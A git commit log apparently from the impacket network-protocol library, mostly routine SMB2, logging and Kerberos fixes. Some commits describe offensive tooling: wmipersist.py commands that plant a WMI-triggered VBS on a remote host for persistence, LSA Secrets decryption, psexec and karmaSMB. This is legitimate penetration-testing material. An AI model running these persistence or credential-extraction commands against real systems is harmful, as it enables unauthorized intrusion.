Author: CoolOppo <CoolOppo@users.noreply.github.com>
Date:   Tue May 26 21:53:47 2015 -0400

    Rename README to README.md
    
    This enables syntax-highlighting on GitHub.

commit 6a130cc05d4059efe87b55b6ad0aefa02547bcb6
Author: CoolOppo <CoolOppo@users.noreply.github.com>
Date:   Tue May 26 21:52:36 2015 -0400

    Syntax highlighting and copy-edited README

commit 6ef8ae60bb2d436175b0c125b8ab1abd2e1c6ca5
Author: asolino <bethus@gmail.com>
Date:   Tue May 26 19:41:31 2015 -0300

    Replacing decode('hex')/encode('hex')
    
    for binascii's hexlify/unhexlify, mainly because of http://bugs.python.org/issue7475
    and Python3 not having it.

commit 4e32a0d4983d7480e5fa94546ffbe5fc83ca88a0
Author: asolino <bethus@gmail.com>
Date:   Mon May 25 20:40:17 2015 -0300

    Removing some pyCharm's erros/warnings
    
    More scripts/libs changed. Hopefully doesn't break a thing. Test cases are passing

commit 0fc523de873f9f2085d90533d428a4f156a6d422
Author: asolino <bethus@gmail.com>
Date:   Mon May 25 20:37:57 2015 -0300

    The examples theme won't be applied if the init() function isn't called.
    
    In short, in every example you should do:
    import logging
    from impacket.examples import logger
    
    and later in main()
    
        # Init the example's logger theme
        logger.init()
    
    then you can write to the logger using:
    logging.info()
    logging.warning(),
    etc.

commit 0785c5afd30a23d6c622823d31f4391c18eb7e46
Author: asolino <bethus@gmail.com>
Date:   Sat May 23 18:31:08 2015 -0300

    Removing some pyCharm's erros/warnings
    
    Hopefully doesn't break a thing. Test cases are passing

commit dbcacbfaf12bba537f13330cf111cecb68b42da7
Author: asolino <bethus@gmail.com>
Date:   Sat May 23 17:23:36 2015 -0300

    Fixes https://github.com/CoreSecurity/impacket/issues/62
    
    Error on import cause by https://github.com/CoreSecurity/impacket/commit/8b8f8a694703858b217117cffad83c6a61b38065.
    Hopefully it's the only one.

commit 8b8f8a694703858b217117cffad83c6a61b38065
Author: asolino <bethus@gmail.com>
Date:   Sat May 23 11:56:59 2015 -0300

    Pyton imports fixups
    
    1) Removed unnecesary imports, avoid import * whenever possible
    2) Copyright updated
    3) Minor typos fixed
    4) File formats to Unix (LF)

commit b4f2d768f75b1836fca1452d8ed9dce349228917
Author: asolino <bethus@gmail.com>
Date:   Fri May 8 16:39:12 2015 -0300

    Changed unsupported mech type behaviour.
    
    If SMB client wants to do Kerberos or something we don't support, now we answer
    STATUS_MORE_PROCESSING_REQUIRED specifying the NTLM MechType again. Seems that's
    the right way to do it instead of answering STATUS_NOT_SUPPORTED.

commit 9c980a7304a423c8849d035db13badd28cc4fade
Author: asolino <bethus@gmail.com>
Date:   Tue May 5 19:07:39 2015 -0300

    Fix some typos

commit c6a6790c55b0b5e1b24eb136e07b971d165d438e
Author: asolino <bethus@gmail.com>
Date:   Mon May 4 14:11:04 2015 -0300

    New dev release...

commit 02b4ab82708bfefaa638e92d15aad5998026210c
Author: asolino <bethus@gmail.com>
Date:   Mon May 4 12:18:43 2015 -0300

    Changing version also at setup.py

commit 60a0c5b126a8a42121852de7ef5354beb8e631e3
Author: asolino <bethus@gmail.com>
Date:   Mon May 4 11:59:25 2015 -0300

    Adding Changelog and changing dev version to final.

commit a3b11bcef0c0ead6b7d844e0b2b94656453f58db
Author: asolino <bethus@gmail.com>
Date:   Sun May 3 22:23:18 2015 -0300

    Some corrections to make these tests to pass

commit 535a44f69b68062218b2dced82456ec93562f1a4
Author: asolino <bethus@gmail.com>
Date:   Sun May 3 22:01:59 2015 -0300

    Some corrections to make these tests to pass

commit 6fc56f05b9867db72f8e0ef32e888e883c924bf0
Author: asolino <bethus@gmail.com>
Date:   Fri May 1 18:53:22 2015 -0300

    `psexec.py` now defaults to executing cmd.exe if no command is specified
    
    I don't know why I didn't do this before but more than one of you
    fell on that little detail.
    There might be a reson tho :s.. testing needed!

commit 8a96b280c92020e8fafc034646f72ce515b81346
Author: asolino <bethus@gmail.com>
Date:   Fri May 1 16:43:24 2015 -0300

    Removing these files. Outdated

commit 9c85ee047a8be00ae22858b43bd13516a261e18a
Author: asolino <bethus@gmail.com>
Date:   Fri May 1 13:31:32 2015 -0300

    No need to encode the serviceName. It fails on some XP versions
    
    This was left from the old RPC runtime where we had to manually encode things.
    Now it's all handled by ndr.py

commit 352816b37f01e9d6240cc21753eb9336644e6199
Author: asolino <bethus@gmail.com>
Date:   Thu Apr 30 18:05:37 2015 -0300

    Adding log level message format and adding try/catch to fail gracefully
    
    Small fixes. Almost ready to tag new version

commit 925aa52c1640be19657f117ad9fb4534e9b16210
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 29 10:26:27 2015 -0300

    Added `from __future__ import with_statement` for older Python versions

commit 3f0585a2b832815daeeb03de5af9356fd2d81244
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 28 16:12:07 2015 -0300

    SMB2_QUERY_DIRECTORY and SMB.TRANS.FIND_FIRST2 information levels updated
    
    Plus now it returns STATUS_NOT_SUPPORTED (only in SMB2) if the level
    is not present.

commit 34a490e2a694c2636e2f83ef439aacc3129b2b51
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 28 11:12:41 2015 -0300

    SRVSServer.NetrShareGetInfo() fix when non existent share was sent.
    
    The SMBServer has a mini DCERPC server serving a minimal subset of
    [MS-SRVS] calls used by clients.
    The NetrShareGetInfo() method was assuming the share asked for
    information was always existing, something that could not be true.
    Calling, from the client, 'start \\smbserver\SHARE', and SHARE being
    non existant was triggering this problem.
    Now if the share doesn't exist the method returns WEE_NET_NAME_NOT_FOUND.

commit fde21c2b810db4efbdcb75ab7593664872677e4b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 27 22:41:35 2015 -0300

    SPNEGO MechType check
    
    We now check the selected MechType is for NTLM auth. If not, we fail gracefully with STATUS_NOT_SUPPORTED

commit 816a950b2a94e66596fd1396cdf4ee9f6b6b0442
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 27 21:13:17 2015 -0300

    Updates to SMB2 Server
    
    1) We need to store the new filename inside the connData['OpenedFiles'] dictionary
    when renaming a file
    2) SMB2Lock wasn't unpacking correctly, producing an error.
    
    BTW, OSx SMB client implementation sucks.

commit 53306c9c8926cc67ebeb620dd27701ee85d4a80e
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 27 20:11:56 2015 -0300

    Updates to SMB2 Server
    
    1) Dummy SMB2_LOCK, SMB2_CANCEL added
    2) SMB2_FLUSH added
    3) SMB2_FILE_INTERNAL_INFO level added
    4) Getting fileID from previous compound request for all functions that apply
    5) Fixed path calculation when renaming a file outside the root tree dir
    
    Looks like it's working OK from Linux/Windows and OSX (guest login)

commit 94b141881bc076303ff6b7e635a807b37851b163
Author: asolino <bethus@gmail.com>
Date:   Sat Apr 25 16:58:36 2015 -0300

    Added SMBSERVER() support for renaming files/folders through SMB2_SET_INFO.
    
    This is what explorer uses when renaming files/folders.

commit 4c2e64ad3add7e40609834a7a8f046ca86304e56
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 18:42:12 2015 -0300

    Second round of logging change.
    Now there should be a single logger called 'impacket' the library uses.
    By default is has a NullHandler so nothing is printed, but messages are
    forwarded to the upstream logger.
    
    If you are a script using the library and want to set the root logger
    with a custom formatter, you can import impacket.examples.logger.
    
    After some testing I'll merge it into master

commit 7e99da87f92244fce5caa659bb122dfe2c4f4991
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 13:18:26 2015 -0300

    Adding debug parameter

commit 119e4438dd8227a138d5ecc2052646c3a81b9e4e
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 12:52:32 2015 -0300

    Changing logging mechanisms everywhere.
    Full details coming soon

commit 0730a3428af8bd1625a205420dbdc5e2af892bda
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 14:58:06 2015 -0300

        Playing with logging, trying to get to something useful to finally have a decent logging inside impacket.
    
        1) We basically define a logger called 'impacket' at the library's __init__, set out a NullHandler for it, and
    
        2) All the logging stuff in version.py removed
    
        With this we have a single logger called 'impacket' for the library.
    
        Now.. what about the example scripts?
    
        1) Move the impacket/logger.py to impacket/examples/logger.py, since this is something that is used just by the
    
        2) Example scripts should import that file in order for the library logs to be shown right (from impacket.examp
    
        For third-party developers that want to disable or change the logs generated by the library:
    
        1) They could, inside the scripts, logging.getLogger('impacket').disabled = True, or add handlers, or whatever.
    
        Testing needed..

commit c2b47d34365d81c8d7de1e445da3999ea2e8a342
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 22 14:49:19 2015 -0300

    Playing with logging, trying to get to something useful to finally have a decent logging inside impacket.
    
    1) We basically define a logger called 'impacket' at the library's __init__, set out a NullHandler for it, and assign a global variable LOG that will need to be imported from all the library modules. From now on, ALL library modules LOG through that variable. All modules should have 'from impacket import LOG'
    
    2) All the logging stuff in version.py removed
    
    With this we have a single logger called 'impacket' for the library.
    
    Now.. what about the example scripts?
    
    1) Move the impacket/logger.py to impacket/examples/logger.py, since this is something that is used just by the example modules (yeah, shouldn't be inside the library itself, but oh well). Inside logger.py, we modify the root logger and change the format of the messages (as set by @lanjelot). The root logger is held in a global variable called SLOG (scripts log?.. another ideas welcomed).
    
    2) Example scripts should import that file in order for the library logs to be shown right (from impacket.examples.logger import SLOG). Plus if they want to log themselves, they can use SLOG.
    
    For third-party developers that want to disable or change the logs generated by the library:
    
    1) They could, inside the scripts, logging.getLogger('impacket').disabled = True, or add handlers, or whatever.
    
    Testing needed..

commit 10c54429c22e0277934108b520684b24f3f60bc7
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 24 12:55:35 2015 -0300

    Fix SMBSERVER error when no challenge was set in config file.
    
    https://github.com/CoreSecurity/impacket/pull/57 added option for setting
    a custom challenge in SimpleSMBServer class. However, those modules that
    would instantiate an SMBSERVER directly (e.g. karmaSMB) would fail if the
    challenge option wasn't set.
    I've added a the default challenge to be 'A'*8 at the SMBSERVER class level.

commit 8b359e16252c59caec093e13cd76e906fd6f5c0f
Merge: dc1b6487 3352733f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Apr 22 09:23:11 2015 -0300

    Merge pull request #57 from byt3bl33d3r/master
    
    Added option to set custom SMB challenge in smbserver.py

commit 3352733f434bff1f929f3bcc5135bdab9a769f60
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Wed Apr 22 07:38:36 2015 +0200

    added missing )

commit 4a54672034cc9a8ae1dec124d803292b6b6b67a9
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Wed Apr 22 07:37:11 2015 +0200

    modified comment

commit 028dcdb90cdcd78747d47a94ecdca86546e97867
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 23:50:33 2015 +0200

    have no idea what i was thinking at the time

commit 9c7b50e34f5276332e632d5534da0a852b21e887
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 22:45:51 2015 +0200

    corrected a comment

commit 7d532eef967666b4e11024efd7a74a12e809303a
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 22:27:36 2015 +0200

    removed debug print statements

commit 73fdb533dd2835c2996e4d392384bde053a459c2
Author: byt3bl33d3r <byt3bl33d3r@gmail.com>
Date:   Tue Apr 21 22:25:40 2015 +0200

    added option to set smb challenge in smbserver.py

commit dc1b6487edb3a35284ce50ea6a9c47bd55aad69b
Author: asolino <bethus@gmail.com>
Date:   Tue Apr 21 12:57:10 2015 -0300

    Adding SMB2 support for karmaSMB
    
       The SMB2 support works with a caveat. If two different
       filenames at the same share are requested, the first
       one will work and the second one will not work if the request
       is performed right away. This seems related to the
       QUERY_DIRECTORY request, where we return the files available.
       In the first try, we return the file that was asked to open.
       In the second try, the client will NOT ask for another
       QUERY_DIRECTORY but will use the cached one. This time the new file
       is not there, so the client assumes it doesn't exist.
       After a few seconds, looks like the client cache is cleared and
       the operation works again. Further research is needed trying
       to avoid this from happening.

commit 809b2c89208d204bc6daf68500afebc665a33548
Merge: e9614738 c7d1786b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 20 21:02:06 2015 -0300

    Merge branch 'master' of https://github.com/CoreSecurity/impacket

commit e96147381b170b701a2f82203214a3392ed88358
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 20 20:57:57 2015 -0300

    Adding initial support for SMB2 (SMB 2.002) dialect. If not explicitly specified, it should all work still the same (SMB1).
    It can be tested running the smbserver.py example with the -smb2support parameter. Looks like it's working from
    Windows clients and Samba clients (Samba 4.2.x).
    A lot of testing needed!

commit c7d1786bc27f92186b41bafdd85bcd5cccdd783a
Author: asolino <bethus@gmail.com>
Date:   Fri Apr 17 15:35:10 2015 -0300

    Updated README

commit f0cf1be7b4ee64f0f3cd65d27df6af998d6e4b26
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 15 13:26:25 2015 -0300

    Replacing google.code links for github

commit 91763930805347767590d750d2a7681cd4b2861d
Author: asolino <bethus@gmail.com>
Date:   Wed Apr 15 13:17:34 2015 -0300

    Replacing google.code links

commit a186ff111d68237ef46e81ecaf83f85fed5e0aa4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 14 16:56:25 2015 +0000

    Adding S4U2Self structures

commit 8ab5bffc9487c129a217df47d78240da87100924
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 21:13:17 2015 +0000

    Adding keytype. Not documented by MSFT, but it's clearly the NTHASH
    0xffffff74:'rc4_hmac'

commit 4d6b5cebb82dbb6c7694ccea4616c3b43debd244
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 21:01:52 2015 +0000

    If we don't know the KeyType's string name, we just put its number

commit 04fd08a4a4269286b33a97dad97983350bc4b6e6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 19:53:09 2015 +0000

    Fixed a typo and clarified the examples

commit 1f377339ff4a00ae0b3ae923a812b3e7c5c19af6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 19:00:37 2015 +0000

    Adding -target-ip switch in case you cannot resolve it

commit 2961a45867f97529b8099647a72b93b85df7d1d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 18:20:13 2015 +0000

    More checks to verify the target ETYPE is supported. The domain controller functional level might be another situation that can trigger AES not supported

commit c444e653f59720fbb2ebb3fec0ad37c352be3528
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 10 17:53:37 2015 +0000

    More checks to verify the target ETYPE is supported. This could be triggered on a Windows 2008 R2 SP1 (SP0 accepts AES).

commit 0c4fe32fb1969d3cf9fc1af5dac3612dff817b30
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 9 20:50:13 2015 +0000

    Synchronizing with impact's internal repo

commit a46cad19552a4fe72dfab31ba2dcbb6f1fb6f1ae
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 9 19:19:47 2015 +0000

    Adding more checks in case we get a KDC_ERR_ETYPE_NOSUPP error. We try to switch to RC4 and hope for the best

commit e78a860d38be3744b04aba7646ed0862b207d029
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 8 17:50:10 2015 +0000

    Updated description:
    
    # This script creates/removes a WMI Event Consumer/Filter and link
    # between both to execute Visual Basic based on the WQL filter
    # or timer specified.
    #
    # Author:
    #  beto (@agsolino)
    #
    # Example:
    #
    # write a file toexec.vbs the following:
    #       Dim objFS, objFile
    #       Set objFS = CreateObject("Scripting.FileSystemObject")
    #       Set objFile = objFS.OpenTextFile("C:\ASEC.log", 8, true)
    #       objFile.WriteLine "Hey There!"
    #       objFile.Close
    #
    #
    # then excute this script this way, VBS will be triggered once
    # somebody opens calc.exe:
    #
    #  wmipersist.py domain.net/adminuser:mypwd@targetHost install -name ASEC
    #   -vbs toexec.vbs
    #   -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance
    #            ISA "Win32_Process" AND TargetInstance.Name = "calc.exe"'
    #
    # or, if you just want to execute the VBS every XXX milliseconds:
    #
    #  wmipersist.py domain.net/adminuser:mypwd@targetHost install -name ASEC
    #   -vbs toexec.vbs -timer XXX
    #
    # to remove the event:
    #       wmipersist.py domain.net/adminuser:mypwd@targetHost remove -name ASEC
    #
    # if you don't specify the password, it will be asked by the script.
    # domain is optional.
    #

commit 29ef8f394a3e340ca318d64bbee1f5dd5f8420d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 8 17:45:34 2015 +0000

    Clarifications on the scope of the script

commit f4819fa9ba38c355d863838ec0b1ce9c29673242
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 7 13:25:11 2015 +0000

     This script creates/removes a WMI Event Consumer/Filter and link
     between both to execute Visual Basic based on the WQL filter specified.
    
     Example:
    
     write a file toexec.vbs the following:
            Dim objFS, objFile
            Set objFS = CreateObject("Scripting.FileSystemObject")
            Set objFile = objFS.OpenTextFile("C:\ASEC.log", 8, true)
            objFile.WriteLine "Hey There!"
            objFile.Close
    
    
     then excute this script this way, VBS will be triggered once
     somebody opens calc.exe:
    
      wmipersist.py domain.net/normaluser:mypwd@domain-dc install -name ASEC
       -vbs toexec.vbs
       -filter 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance
                ISA "Win32_Process" AND TargetInstance.Name = "calc.exe"'
    
     or, if you just want to execute the VBS every XXX milliseconds:
    
      wmipersist.py domain.net/normaluser:mypwd@domain-dc install -name ASEC
       -vbs toexec.vbs -timer XXX
    
     to remove the event:
            wmipersist.py domain.net/normaluser:mypwd@domain-dc remove -name ASEC

commit 82ec2f4f0d436626304416fb6efc3173a071f538
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 6 15:42:42 2015 +0000

       The idea of this script is to get a list of the sessions
       opened at the remote hosts and keep track of them.
       Coincidentally @mubix did something similar a few years
       ago so credit goes to him (and the script's name ;)).
       Check it out at https://github.com/mubix/netview
       The main difference with our approach is we keep
       looping over the hosts found and keep track of who logged
       in/out from remote servers. Plus, we keep the connections
       with the target systems and just send a few DCE-RPC packets.
    
       One VERY IMPORTANT thing is:
    
       YOU HAVE TO BE ABLE TO RESOLV THE DOMAIN MACHINES NETBIOS
       NAMES. That's usually solved by setting your DNS to the
       domain DNS (and the right search domain).
    
       Some examples of usage are:
    
       netview.py -target 192.168.1.10 beto
    
       This will show the sessions on 192.168.1.10 and will authenticate as 'beto'
       (password will be prompted)
    
       netview.py FREEFLY.NET/beto
    
       This will download all machines from FREEFLY.NET, authenticated as 'beto'
       and will gather the session information for those machines that appear
       to be up. There is a background thread checking aliveness of the targets
       at all times.
    
       netview.py -users /tmp/users -domainController freefly-dc.freefly.net -k FREEFLY.NET/beto
    
       This will download all machines from FREEFLY.NET, authenticating using
       Kerberos (that's why domainController parameter is needed), and filter
       the output based on the list of users specified in /tmp/users file.

commit 56727f344501fd4091aab1adf60dafef2c43f055
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 21:40:02 2015 +0000

    Adding pyasn1 as requirement

commit 0df6b23153648f24768c79e1dbc7b96a6c2e4c94
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 17:45:22 2015 +0000

    Fixed wrong definition for LPDWORD

commit 7c3ca072b5de80606edf753ac9eaec533f71780b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 17:18:28 2015 +0000

    Synchronizing with impact's internal repo

commit 03cfbd23f1681ed5354def0a1d7fc28e9717b94b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 1 17:04:23 2015 +0000

    Changing padding from 8 to 4, seems to be effective when using RPC_C_AUTHN_LEVEL_PKT_INTEGRITY and RPC_C_AUTHN_GSS_NEGOTIATE

commit 50b59ffcdf56e6ba88f77bafe40af096287e4b83
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 26 21:52:00 2015 +0000

    We're just showing that CCache file was used if debugging output is chosen. Hope it doesn't confuse ppl, but it's kind of annoying to get those messages all the time.

commit ff6a318df35004db8e4efcfc1bda7e49f3f118b6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 26 21:15:50 2015 +0000

    Adding -debug flag

commit 957ab8586419b7884e4ba5acf5f002e34cbc2de0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 24 22:29:29 2015 +0000

    Changed the who command so you can list the active sessions w/o the need of being Administrator. The whole trick was to use a different information level

commit 25188dad4ba894cf80061f794c96a0247cf32e92
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:46:52 2015 +0000

    Fixes kerberosLogin calling way

commit a4f6260676492ea196d675c1440d623e6404bf0d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:28:20 2015 +0000

    Typo

commit d5238f0817ca144f2a3f0074835ce94677c8dca6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:25:53 2015 +0000

    Adding small description when calling the scripts w/no arguments

commit 5a2a246f3da8d7d4d5977a10078dd3639a9489b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 20 19:21:09 2015 +0000

    Adding TGT, TGS when receiving get_credentials() data

commit a64365dcba4b1ac8a0092616219406e1480790a5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 19 22:19:30 2015 +0000

    getCredentials() now returns more data

commit 0fcf9d3780e570e99a3bb1ed6001aca50acfed68
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 19 22:18:08 2015 +0000

    This changeset allows passing TGT/TGS tickets to the DCERPC runtime. Check krb5/ccache.py toTGT()/toTGS() methods to see what the expected format must be.
    Main changes were adding TGT/TGS to the getCredentials()/get_credentials() and set_credentials() methods in the smb*/dcerpc/rpcrt/dcomrt/transport* files.
    Testing needed!

commit 192ab359b4c84c9043588109583d2952f9882b87
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 18 19:56:53 2015 +0000

    Adding the following types:
    LONG64, WORD, OBJECT_TYPE_LIST

commit 185bdbbb49875a7157d10bae67afac59818e50fb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 17 14:30:21 2015 +0000

    We extract the domain name from the authenticateMessage instead of the command line. This will increase the chances of success since request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] must match the authenticate['domain_name'] field.

commit 872c656a74d0c61fb2b2b6ed80ca9224ba31d663
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 17 12:54:34 2015 +0000

    Fixed a bug that would cause DCOMConnection.PINGTIMER to be set to None when there were already active connections.

commit 734fa44b90cbf4cea6c7824fb84a08626adab8c4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 16 16:45:07 2015 +0000

    removed traceback prints

commit 5ca4e2278008b1ceaa8f47eaf8a504cf3b455cfb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 13 05:40:10 2015 +0000

    Fixes LSA Secrets decryption on NT5 x64 systems as described by Sebastien Macke at https://www.trustwave.com/Resources/SpiderLabs-Blog/Dumping-LSA-Secrets-on-NT5-x64

commit 7f041090f35004022b4e5cb8ea0b34e13fa96b60
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 10 17:06:06 2015 +0000

    Adding support for CVE-2015-0005

commit f79acb0a3928ce76cab104815b241a47f926e054
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 10 17:01:55 2015 +0000

    Adding support for CVE-2015-0005

commit 84568806cb9e18d71647341a8b4b36ff3b4a24c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 9 16:29:43 2015 +0000

    1) Fixing definitions for opnums 21/22 and 23
    2) IEnumWbemClassObject_Next lTimeout should be ULONG instead of LONG
    3) ExecNotificationQuery() result is casted to a IEnumWbemClassObject()

commit 1f2e2bc501643b4484de00ab825177882a76e1a4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Mar 8 14:35:28 2015 +0000

    Always comparing SPNs in uppercase

commit 5cbfd48e039a1f9ff87d75bcb2e9e4a4be2b0dfa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 7 22:40:43 2015 +0000

    Casting the return values for the methods called

commit f538b88a34ad56a3d24e665d369d26012fde1dc2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 7 22:18:40 2015 +0000

    Better error control

commit 7d6cf3f174497e1da584edf36f53f4acaff85965
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 5 15:42:51 2015 +0000

    Fixes an STATUS_INVALID_PARAMETER response against some Samba Servers

commit 49926d6e389b00625387b61a9772d938985e7fef
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 4 19:12:10 2015 +0000

    Changing some default values for these strucs.. mimicking what Windows is returning back

commit d4c9d1a6314d4f971d4141fd037199728c16c4e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 3 21:17:14 2015 +0000

    Adding a few structures and constants for the smbserver

commit d6d3f89f7c3a822e0e9c4f788a6d07eb8475759d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 24 15:16:54 2015 +0000

    Using PyCrypto's gcd implementation

commit 8596051e4bc2a23e3706362404b2381dd0f58846
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 18 19:59:33 2015 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=53 reported by crlawrence. I applied the patch provided. Thanks!

commit 0ba062b88c607f1c6d82e19de9a715363348bd86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 17:51:40 2015 +0000

    Unregistering commands we don't really need

commit 67b4e2d2ca3611b13d7dc5e0ad2efcd78a9c7b0f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 17:51:14 2015 +0000

    Adding unregisterSmbCommand(), unregisterNTTransaction(), unregisterTransaction2() and unregisterTransaction().
    Useful if you want to provide a constrainted SMB Server.
    Note that if the command asked by the client is not registered, the SMB Server will automatically return STATUS_NOT_IMPLEMENTED.

commit f96cae5f6f47ee4b5f71a1e73925d5b5a7992b26
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 16:19:28 2015 +0000

    Let's try to avoid allowing write requests from the client back to us
    not 100% bulletproof, plus also the client might be using other SMB
    calls (e.g. SMB_COM_WRITE)

commit f12a89c3656a7a490df201c4284d73e9ef03ca5f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 14:26:56 2015 +0000

    One important ToDo:
    
       [ ] Disable write request, now if the client tries to copy
           a file back to us, it will overwrite the files we're
           hosting. *CAREFUL!!!*

commit aed578854fff86653e4129c49d341d4a04c19784
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 13:45:29 2015 +0000

    Adding NETLOGON, SYSVOL shares (fakes), in case they are asked

commit 004371f5d04345bbb999c256a92973350b9d005f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 12 12:24:19 2015 +0000

    The idea of this script is to answer any file read request
    with a set of predefined contents based on the extension
    asked, regardless of the sharename and/or path.
    When executing this script w/o a config file the pathname
    file contents will be sent for every request.
    If a config file is specified, format should be this way:
